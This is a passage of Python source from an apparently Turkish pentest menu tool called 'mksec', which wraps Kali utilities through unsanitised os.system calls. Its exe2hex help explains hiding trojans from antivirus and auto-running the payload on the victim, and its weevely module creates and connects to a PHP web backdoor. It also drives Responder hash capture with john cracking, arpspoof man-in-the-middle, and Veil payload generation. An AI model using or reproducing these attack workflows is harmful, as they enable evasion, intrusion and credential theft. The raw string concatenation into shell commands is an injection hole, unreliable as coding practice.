        youriface = os.popen('ip addr').read().split("2:")[1].split(":")[0]
        os.popen('ip addr show {}'.format(youriface)).read().split("inet ")[1].split("/")[0]
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[macchanger]\033[37m\x1b[0m ")
            UserInputs(uinput+"sniff")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[37m\x1b[35mMacchanger\x1b[37m, it is used to change the MAC address.\n\n\x1b[33mUsage:\x1b[37m\n\x1b[33m======\x1b[37m\nIf you want to randomly change your MAC address just fill in 'IFACE' and type \x1b[32m'run --random' or 'run -r'\x1b[37m.\nIf you want to change your MAC address manually, fill in 'IFACE' and 'MANUAL' and type \x1b[32m'run --manual' or 'run -m'\x1b[37m.\nIf you want to revert to your default MAC address just fill in 'IFACE' and type \x1b[32m'run --default' or 'run -d'\x1b[37m.\n\n\n\x1b[35mMacchanger\x1b[37m, MAC adresini değiştirmek için kullanılır.\n\n\x1b[33mKullanım:\x1b[37m\n\x1b[33m=========\x1b[37m\nRandom olarak MAC adresinizi değiştirmek istiyorsanız sadece 'IFACE' kısmını doldurun ve \x1b[32m'run --random' or 'run -r'\x1b[37m yazın.\nManuel olarak MAC adresinizi değiştirmek istiyorsanız 'IFACE' ve 'MANUAL' kısımlarını doldurun ve \x1b[32m'run --manual' or 'run -m'\x1b[37m yazın.\nDefault MAC adresinize geri dönmek istiyorsanız sadece 'IFACE' kısmını doldurun ve \x1b[32m'run --default' or 'run -d'\x1b[37m yazın.\n")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIFACE {}    YES          Your interface  =\x1b[32m{}\x1b[37m\nMANUAL{}    OPT          Manual MAC address \x1b[32mex: 11:22:33:33:22:11\x1b[37m".format(iface,youriface,manual))
            elif "set iface" in uinput.lower():
                iface = uinput
                iface = iface.replace("set iface ","").replace("set IFACE ","").replace("SET iface ","").replace("SET IFACE ","").center(25)
            elif "set manual" in uinput.lower():
                manual = uinput
                manual = manual.replace("set manual ","").replace("set MANUAL ","").replace("SET manual ","").replace("SET MANUAL ","").center(25)
            elif "run" == uinput.lower():
                print("\x1b[1m\x1b[31mCommand not found. You can check the run command by typing 'info'\x1b[1m")
            elif "run --random" == uinput.lower() or "run -r" == uinput.lower():
                os.system("sudo macchanger -r " + iface.strip())
            elif "run --manual" == uinput.lower() or "run -m" == uinput.lower():
                os.system("sudo macchanger --mac " + manual.strip() + " " + iface.strip())
            elif "run --default" == uinput.lower() or "run -d" == uinput.lower():
                os.system("sudo macchanger -p " + iface.strip())

    def responder():
        os.system("""echo \x1b[1m' 
        _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
        |                                           responder                                           |
        |                                                                                               |
        |  ag uzerindeki cihazlarin netbios undan gelen istekleri izler ve takip eder                   |
        |                                                                                               |
        |  ag uzerindeki cihaz,                                                                         |
        |  dosya paylasiminda ya da sitelerde sifre girdiyse bunlarin log kaydini hashli sekilde tutar  |
        |  aracin log kayitlari /usr/share/responder/logs/ icerisinde tutulur                           |
        |  ex: /usr/share/responder/logs/HTTP-NTLMv2-192.168.10.8.txt                                   |
        |                                                                                               |
        |  hashli verileri nasil kirabilirsiniz?                                                        |
        |  john /usr/share/responder/logs/HTTP-NTLMv2-192.168.10.8.txt                                  |
        |                                                                                               |
        |  back go back                                                                                 |
        |-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-|'
        """) 
        os.system("echo '\n'")
        os.system("ifconfig")
        os.system("echo 'ex: eth0'")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        if uinput == "back":
            os.system("clear")
            sniffingSpoofing()
        else:
            os.system("""echo '
        agdaki cihazlari izleme isleminiz bittiginde ctrl+c ile islemi istediginiz zaman sonlandirin
        devam ederseniz, agdaki cihazlari sonsuza kadar takip edecektir ve log kayitlari tutacaktir'""")
            os.system("echo ' simdi baslamak icin ctrl + c yapiniz ' -a -d backback9")
            os.system("responder -I " + uinput)

    def exe2hex():
        userexe = "                         "
        userpayload = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[exe2hex]\033[37m\x1b[0m ")
            UserInputs(uinput+"post")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mExe2hex is a tool that converts exe files to hexadecimal codes. (Not only the .exe extension, it also works for .py files or any file extension.)\n\x1b[35mWhat does it do?\x1b[37m\nUsually, trojans are caught by firewalls or antivirus programs.\nIf we convert the trojan to hexadecimal codes, firewalls and antivirus programs may not understand hexadecimal codes.\nFor this reason, it is difficult to detect.\nIn some cases it can never be detected.\n\x1b[35mThe situation to be considered after using the exe2hex tool!\x1b[37m\nType 'start file_name.exe' in the last line of the created .cmd file.\n\x1b[35mWhat happens if you don't?\x1b[37m\nThe exe extension will not run automatically.\nUser has to open file_name.exe manually and we don't like that (:\nIf the \x1b[36m'run'\x1b[37m command does not work, try with \x1b[36m'run -f'\x1b[37m (-f : --force). \n\x1b[33mTR:\x1b[37mExe2hex, exe dosyalarını hexadecimal kodlarına çeviren bir araçtır. (Sadece .exe uzantısı değil, .py uzantılı dosyalar ya da herhangi bir dosya uzantısında da işe yarar.)\n\x1b[35mNe işe yarar?\x1b[37m\nGenellikle trojanlar güvenlik duvarlarına ya da antivirüs programlarına yakalanır.\nEğer trojanı hexadecimal kodlarına çevirirsek güvenlik duvarları ve antivirüs programları hexadecimal kodlarını anlamayabilir.\nBu nedenden dolayı tespit etmekte zorlanır.\nBazı durumlarda asla tespit edilemez.\n\x1b[35mExe2hex aracı kullanıldıktan sonra dikkat edilmesi gereken durum!\x1b[37m\nolusturulan .cmd uzantılı dosyanın son satırına 'start dosya_adı.exe' yazınız.\n\x1b[35mEğer bunu yapmazsanız ne olur?\x1b[37m\nExe uzantısı otomatik olarak çalıştırılmayacaktır.\nKullanıcı manuel olarak dosya_adı.exe dosyasını açması gerekir ve biz bunu sevmeyiz (:\n\x1b[36m'run'\x1b[37m komutu çalışmazsa \x1b[36m'run -f'\x1b[37m (-f : --force) ile deneyiniz.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nFILE  {}    YES          The EXE binary file to convert \x1b[32mex: /root/Desktop/mksec.exe\x1b[37m\nOUTPUT{}    YES          Extension must end with .cmd \x1b[32mex: /root/Desktop/mksec.cmd\x1b[37m".format(userexe,userpayload))
            elif "set file" in uinput.lower():
                userexe = uinput
                userexe = userexe.replace("set file ","").replace("set FILE ","").replace("SET file ","").replace("SET FILE ","").center(25)
            elif "set output" in uinput.lower():
                userpayload = uinput
                userpayload = userpayload.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo exe2hex -x " + userexe.strip() + " -o " + userpayload.strip())
            elif "run -f" == uinput.lower():
                os.system("cd /opt/exe2hex/ && sudo python3 exe2hex.py -x " + userexe.strip() + " -o " + userpayload.strip())

    def weevely():
        def createabackdoor():
            output = "                         "
            backdoorpassword = "                         "
            while 1:
                uinput = input("\x1b[1m\033[36m[mksec]\033[36m[create_backdoor]\033[37m\x1b[0m ")
                UserInputs(uinput+"post")
                if uinput.lower() == "info":
                    print("\x1b[1m\x1b[37m\x1b[33mWeevely\x1b[37m ile sifreli bir shell(backdoor) olusturun!")
                elif uinput.lower() == "options":
                    print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nPASSWORD{}    YES          Add password \x1b[32mex: ex: passw0rd!\x1b[37m\nOUTPUT  {}    YES          Output \x1b[32mex: /root/Desktop/backdoor.php\x1b[37m".format(backdoorpassword,output))
                elif "set password" in uinput.lower():
                    backdoorpassword = uinput
                    backdoorpassword = backdoorpassword.replace("set password ","").replace("set PASSWORD ","").replace("SET password ","").replace("SET PASSWORD ","").center(25)
                elif "set output" in uinput.lower():
                    output = uinput
                    output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
                elif "run" == uinput.lower():
                    os.system("weevely generate " + backdoorpassword.strip() + " " + output.strip())
        
        def backdoorlistener():
            link = "                         "
            listenerpassword = "                         "
            while 1:
                uinput = input("\x1b[1m\033[36m[mksec]\033[36m[backdoor_listener]\033[37m\x1b[0m ")
                UserInputs(uinput+"post")
                if uinput.lower() == "info":
                    print("\x1b[1m\x1b[37m\x1b[33mWeevely\x1b[37m ile olusturdugunuz backdoor'u dinlemenizi saglar.")
                elif uinput.lower() == "options":
                    print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nPASSWORD{}    YES             Enter your backdoor password \x1b[32mex: ex: passw0rd!\x1b[37m\nHOST    {}    YES             Backdoor location \x1b[32mex: http://192.168.10.8/dvwa/hackable/uploads/backdoor.php\x1b[37m".format(listenerpassword,link))
                elif "set password" in uinput.lower():
                    listenerpassword = uinput
                    listenerpassword = listenerpassword.replace("set password ","").replace("set PASSWORD ","").replace("SET password ","").replace("SET PASSWORD ","").center(25)
                elif "set host" in uinput.lower():
                    link = uinput
                    link = link.replace("set host ","").replace("set HOST ","").replace("SET host ","").replace("SET HOST ","").center(25)
                elif "run" == uinput.lower():
                    os.system("weevely " + link.strip() + " " + listenerpassword.strip())

        create = "          FALSE          "
        listener = "          FALSE          "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[weevely]\033[37m\x1b[0m ")
            UserInputs(uinput+"post")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[37m\x1b[33mWeevely\x1b[37m, web siteleri ya da sunucularda antivirus programlarina ve guvenlik duvarlarina yakalanmayan, sizden baskasinin gorse bile anlamayacagi sifreli shell(backdoor) olusturmamizi saglar.\nOlusturulan backdoor weevely ile dinlenebilir.\nIlk once backdoor olusturun ve ardından onu dinleyin.\nSadece tek degeri 'TRUE' yapin ve 'run' komutu ile calistirin.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m                \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m               \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nCREATE BACKDOOR  {}     OPT         Set this value to 'TRUE' to create a backdoor \x1b[32mDefault value = FALSE\x1b[37m\nBACKDOOR LISTENER{}     OPT         Set this value to 'TRUE' to listen for a backdoor \x1b[32mDefault value = FALSE\x1b[37m".format(create,listener))
            elif "set create backdoor" in uinput.lower():
                create = uinput
                create = create.replace("set create backdoor ","").replace("set CREATE BACKDOOR ","").replace("SET create backdoor ","").replace("SET CREATE BACKDOOR ","").center(25).upper()
            elif "set backdoor listener" in uinput.lower():
                listener = uinput
                listener = listener.replace("set backdoor listener ","").replace("set BACKDOOR LISTENER ","").replace("SET backdoor listener ","").replace("SET BACKDOOR LISTENER ","").center(25).upper()
            elif "run" == uinput.lower():
                if create.lower().strip() == "true" and listener.lower().strip() == "false":
                    createabackdoor()
                elif listener.lower().strip() == "true" and create.lower().strip() == "false":
                    backdoorlistener()
                elif create.lower().strip() == "true" and listener.lower().strip() == "true":
                    print('\x1b[1m\x1b[31mYou cannot choose both.')
                else:
                    print("\x1b[1m\x1b[31mYou have not selected one yet\x1b[1m")

    def binwalk():
        format = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[binwalk]\033[37m\x1b[0m ")
            UserInputs(uinput+"fore")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mBinwalk, examines hardware software. Example: .bin, .iso etc... You can also try to examine .py files.\n\x1b[33mTR:\x1b[37mBinwalk, donanımların yazılımlarını inceler. Örnek: .bin, .iso vs... Bunun yanı sıra .py dosyalarını incelemeyi deneyebilirsiniz.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nFORMAT{}    YES          Type the location of the file you want to examine \x1b[32mex: /root/Desktop/mksec.bin\x1b[37m".format(format))
            elif "set format" in uinput.lower():
                format = uinput
                format = format.replace("set format ","").replace("set FORMAT ","").replace("SET format ","").replace("SET FORMAT ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo binwalk -e " + format.strip())
                print("Process Completed")

    def bulkExtractor():
        format = "                         "
        output = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[bulk_extractor]\033[37m\x1b[0m ")
            UserInputs(uinput+"fore")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mBulk Extractor analyzes disks (dev/sda2) or image (iso) files.\n\x1b[33mTR:\x1b[37mBulk Extractor, diskleri (dev/sda2) veya imaj (iso) dosyalarını analiz eder.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nFORMAT{}    YES          Type the location of the file you want to analyze \x1b[32mex: '/root/Desktop/debian.iso' \x1b[37mor\x1b[32m '/dev/sda2'\x1b[37m Type \x1b[32m'--my discs' \x1b[37mor \x1b[32m'-md'\x1b[37m to see your discs\nOUTPUT{}    YES          Output \x1b[32mex: '/root/Desktop/analysis'\x1b[37m".format(format,output))
            elif "set format" in uinput.lower():
                format = uinput
                format = format.replace("set format ","").replace("set FORMAT ","").replace("SET format ","").replace("SET FORMAT ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "--my discs" == uinput.lower() or "-md" == uinput.lower():
                os.system("fdisk -l")
            elif "run" == uinput.lower():
                os.system("bulk_extractor " + format.strip() + " -o " + output.strip() + "")
                print("Process Completed")

    def hashdeep():
        hash = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[hashdeep]\033[37m\x1b[0m ")
            UserInputs(uinput+"fore")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mGets the hash of a file. The data you will encounter will be in the following order. \n\x1b[33mTR:\x1b[37mBir dosyanın hash verisini elde eder. Karşılaşacağınız veriler aşağıdaki sırada olacaktır.\n'SIZE','md5','SHA256','FILENAME'")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nHASH  {}    YES          Enter the file you want to get the hash data \x1b[32mex: '/root/Desktop/mksec.py'\x1b[37m".format(hash))
            elif "set hash" in uinput.lower():
                hash = uinput
                hash = hash.replace("set hash ","").replace("set HASH ","").replace("SET hash ","").replace("SET HASH ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo hashdeep " + hash.strip())
                print("Process Completed")

    def foremost():
        filetype = "                         "
        disc = "                         "
        output = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[foremost]\033[37m\x1b[0m ")
            UserInputs(uinput+"fore")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mForemost finds extensions (.png, .exe etc...) inside disks.\n\x1b[33mTR:\x1b[37mForemost, disklerin içerisindeki uzantıları (.png, .exe vs...) bulur.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nFILETYPE{}    YES          Enter the file type \x1b[32mex: <png, jpeg, pdf, exe,..., all>\x1b[37m\nDISC    {}    YES          Select your disc \x1b[32mex: '/dev/sda1'\x1b[37m Type \x1b[32m'--my discs' \x1b[37mor \x1b[32m'-md'\x1b[37m to see your discs\nOUTPUT  {}    YES          Output \x1b[32mex: '/root/Desktop/mksec'\x1b[37m".format(filetype,disc,output))
            elif "set filetype" in uinput.lower():
                filetype = uinput
                filetype = filetype.replace("set filetype ","").replace("set FILETYPE ","").replace("SET filetype ","").replace("SET FILETYPE ","").center(25)
            elif "set disc" in uinput.lower():
                disc = uinput
                disc = disc.replace("set disc ","").replace("set DISC ","").replace("SET disc ","").replace("SET DISC ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "--my discs" == uinput.lower() or "-md" == uinput.lower():
                os.system("fdisk -l")
            elif "run" == uinput.lower():
                os.system("sudo foremost -t " + filetype.strip() + " -i " + disc.strip() + " -o " + output.strip())
                print("Process Completed")

    def cutycapt():
        url = "                         "
        output = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[cutycapt]\033[37m\x1b[0m ")
            UserInputs(uinput+"rep")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mTakes screenshots of websites.\n\x1b[33mTR:\x1b[37mWeb sitelerinin ekran görüntüsünü alır.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nURL     {}    YES          Target Site  \x1b[32mex: github.com\x1b[37m\nOUTPUT  {}    YES          Output \x1b[32mex: /root/Desktop/mksec.png or .jpg\x1b[37m".format(url,output))
            elif "set url" in uinput.lower():
                url = uinput
                url = url.replace("set url ","").replace("set URL ","").replace("SET url ","").replace("SET URL ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo cutycapt --url=" + url.strip() + " --out=" + output.strip())
                print("Process Completed")

    def pipal():
        wordlist = "                                                            "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[pipal]\033[37m\x1b[0m ")
            UserInputs(uinput+"rep")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mPipal is a wordlist analysis tool. If it doesn't work with the \x1b[36m'run'\x1b[37m command, try the \x1b[36m'run -f'\x1b[37m command.\n\x1b[33mTR:\x1b[37mPipal, wordlist analiz aracıdır. \x1b[36m'run'\x1b[37m komutu ile çalışmıyorsa \x1b[36m'run -f'\x1b[37m komutunu deneyiniz.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m                    \x1b[33mCurrent Setting\x1b[37m                            \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m                   \x1b[33m===============\x1b[37m                            \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nWORDLIST{}    YES          Type the word list location \x1b[32mex: /usr/share/fern-wifi-cracker/extras/wordlists/common.txt\x1b[37m".format(wordlist))
            elif "set wordlist" in uinput.lower():
                wordlist = uinput
                wordlist = wordlist.replace("set wordlist ","").replace("set WORDLIST ","").replace("SET wordlist ","").replace("SET WORDLIST ","").center(60)
            elif "run" == uinput.lower():
                os.system("pipal " + wordlist.strip())
                print("Process Completed")
            elif "run -f" == uinput.lower():
                os.system("cd /opt/pipal/ && ruby pipal.rb " + wordlist.strip())
                print("Process Completed")

    def arpspoof():
        iface = "                         "
        target = "                         "
        router = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[foremost]\033[37m\x1b[0m ")
            UserInputs(uinput+"sniff")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[37m\x1b[33mForemost\x1b[37m, disklerin içerisindeki uzantıları bulur.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIFACE   {}    YES           Write your interface \x1b[32mex: eth0\x1b[37m\nTARGET  {}    YES           Enter the IP address of the target device \x1b[32mex: 192.168.10.5\x1b[37m\nROUTER  {}    YES           Enter the router IP address \x1b[32mex: '192.168.10.1'\x1b[37m".format(iface,target,router))
            elif "set iface" in uinput.lower():
                iface = uinput
                iface = iface.replace("set iface ","").replace("set IFACE ","").replace("SET iface ","").replace("SET IFACE ","").center(25)
            elif "set target" in uinput.lower():
                target = uinput
                target = target.replace("set target ","").replace("set TARGET ","").replace("SET target ","").replace("SET TARGET ","").center(25)
            elif "set router" in uinput.lower():
                router = uinput
                router = router.replace("set router ","").replace("set ROUTER ","").replace("SET router ","").replace("SET ROUTER ","").center(25)
            elif "run" == uinput.lower():
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                os.system("arpspoof -i " + iface.strip() + " -t " + target.strip() + " -r " + router.strip())
                print("Process Completed")

    def nessus():
        os.system("clear")
        while 1:
            print("""\x1b[1m\x1b[36m

                        \x1b[7mNessus\x1b[0m\x1b[1m

                \x1b[37mInstall:\x1b[36m
                >>	linux icin nessus indir
                >>	cd Download/
                >>	dpkg -i Nessus-6.10-debian.deb
                    kurulum tamamlandiktan sonra local site verecektir onu kaydetmemiz gerekir. ex: https://kali:8834/
                >>	service nessusd start
                >>	https://kali:8834/
                    kurulumu tamamlayalim. eger aktivasyon kodu istenirse free kaydolarak alabiliriz
                \x1b[37m----------------------------------------------------------------------------------------------------------------\x1b[36m
                \x1b[37mZaafiyet taramasi:\x1b[36m
                >> 	service nessusd start
                >> 	https://kali:8834/
                >> 	new scan
                >>	advanced scan
                >> 	istedigimiz kisimlari dolduralim ve target kismina ip adresi ya da site adresi yazalim.
                >> 	launch

                \x1b[7mpress <return> to continue\x1b[0m\x1b[1m""")
            uinput = input("")
            UserInputs(uinput+"vuln")

    def veil():
        os.system("""echo \x1b[1m\x1b[36m'

                        \x1b[7mVeil\x1b[0m\x1b[1m

                \x1b[37mInstall:\x1b[36m
                >> apt-get install veil y
                \x1b[37m----------------------------------------------------------------------------------------------------------------\x1b[36m
                \x1b[37mUsage:\x1b[36m
                >> veil
                >> update
                >> list
                >> 1
                >> list
                >> use 14
                >> set LHOST <YOUR.IP.ADDR>
                >> set LPORT 8080
                >> generate
                >> test
                \x1b[7mpress <return> to continue\x1b[0m\x1b[1m'""")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[veil]\033[37m\x1b[0m ")
            UserInputs(uinput+"exp")

    def find():
        print("\x1b[1m\x1b[33m\x1b[7m[EN] Find Command\x1b[0m\x1b[1m\n\x1b[33mEX: find -name mert.sh\x1b[37m\nSearches for the location of the 'mert.sh' file you don't know where it is. \n\x1b[33mEX: find /etc -name local*\x1b[37m\nIt searches for all files and directories starting with 'local' in the '/etc/' directory.\n\x1b[33mEX: find -name linux -type f\x1b[37m\nLists only files with the name 'linux'.\n\x1b[33mEX: find -name linux type d\x1b[37m\nLists only directories with the name 'linux'.\n\x1b[33mEX: find -perm 777\x1b[37m\nLists files with authority '777'.\n\x1b[33mEX: find -name *.jpg\x1b[37m\nSearches for files with the '.jpg' extension. \n\x1b[33mEX: find -name *.jpg | xargs rm\x1b[37m\nThe found '.jpg' files are assigned to xargs and deleted all of them.\n\x1b[33m\x1b[1m\x1b[33m\x1b[7m[TR] Find Komutu\x1b[0m\x1b[1m\n\x1b[33mÖRN: find -name mert.sh\x1b[37m\nNerede olduğunu bilinmeyen 'mert.sh' dosyanın konumunu arar.\n\x1b[33mÖRN: find /etc -name local*\x1b[37m\n'/etc/' dizininde 'local' ile başlayan bütün dosyaları ve dizinleri arar.\n\x1b[33mÖRN: find -name linux -type f\x1b[37m\n'linux' isminin geçtiği sadece dosyaları listeler.\n\x1b[33mÖRN: find -name linux type d\x1b[37m\n'linux' isminin geçtiği sadece dizinleri listeler.\n\x1b[33mÖRN: find -perm 777\x1b[37m\n'777' yetkilendirilmesine sahip dosyaları listeler.\n\x1b[33mÖRN: find -name *.jpg\x1b[37m\n'.jpg' uzantılı dosyaları arar.\n\x1b[33mÖRN: find -name *.jpg | xargs rm\x1b[37m\nBulunan '.jpg' uzantılı dosyaları xargs'a atanır ve hepsini siler.\x1b[37")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[find]\033[37m\x1b[0m")
            UserInputs(uinput+"lin")

    def grep():
        print("\x1b[1m\x1b[33m\x1b[7mGrep Command\x1b[0m\x1b[1m\n\x1b[33mEX: grep 'mert' deneme.txt\x1b[37m\nIt searches for the word 'mert' in the 'txt' extension files in the directory you are in.\n\x1b[33mEX: grep -i 'mert' deneme.txt\x1b[37m\nThe '-i' eliminates case sensitivity.\n\x1b[33mEX: grep -i 'mert' *\x1b[37m\nThe '*' is the escape sequence. It searches all files but not directories.\n\x1b[33mEX: grep -ir 'mert' *\x1b[37m\nSearches in all files and directories.\n\x1b[33mEX: grep -ir 'mert' a*\x1b[37m\nIt searches for mert only in files and directories starting with 'a'.\n\x1b[33mEX: ls | grep 'mert'\x1b[37m\nLists files or directories containing 'mert'.\n\x1b[1m\x1b[33m\x1b[7mGrep Komutu\x1b[0m\x1b[1m\n\x1b[33mÖRN: grep 'mert' deneme.txt\x1b[37m\nBulunduğunuz dizindeki 'txt' uzantılı dosyalarda 'mert' kelimesini arar.\n\x1b[33mÖRN: grep -i 'mert' deneme.txt\x1b[37m\n'-i' büyük küçük harf duyarlılığını ortadan kaldırır.\n\x1b[33mÖRN: grep -i 'mert' *\x1b[37m\n'*' kaçış dizisidir. Bütün dosyalarda arar fakat dizinlerde aramaz.\n\x1b[33mÖRN: grep -ir 'mert' *\x1b[37m\nBütün dosya ve dizinlerde arar.\n\x1b[33mÖRN: grep -ir 'mert' a*\x1b[37m\nSadece 'a' ile başlayan dosya ve dizinlerde mert'i arar.\n\x1b[33mÖRN: ls | grep 'mert'\x1b[37m\nİçerisinde 'mert' olan dosya veya dizinleri listeler.\x1b[37m")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[grep]\033[37m\x1b[0m ")
            UserInputs(uinput+"lin")

    def man():
        print("\x1b[1m\x1b[33m\x1b[7mMan Command\x1b[0m\x1b[1m\n\x1b[33m>> mandb\x1b[37m\nUpdates the man database.\n\x1b[33m>> man -k [command]\x1b[37m\nIf we don't remember the name of the command, but we remember its function, we use it.\n\x1b[32mEX: man -k delete\x1b[36m\n\x1b[32mEX: man -k command\x1b[36m\n\x1b[32mEX: man -k kill\x1b[37m\n\x1b[1m\x1b[33m\x1b[7mMan Command\x1b[0m\x1b[1m\n\x1b[33m>> mandb\x1b[37m\nMan veritabanını günceller.\n\x1b[33m>> man -k [komut]\x1b[37m\nKomutun ismini hatırlamıyorsak ama işlevini hatırlıyorsak kullanırız.\n\x1b[32mÖRN: man -k sil\x1b[36m\n\x1b[32mÖRN: man -k command\x1b[36m\n\x1b[32mÖRN: man -k kill\x1b[37m")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[man]\033[37m\x1b[0m ")
            UserInputs(uinput+"lin")

    def cli():
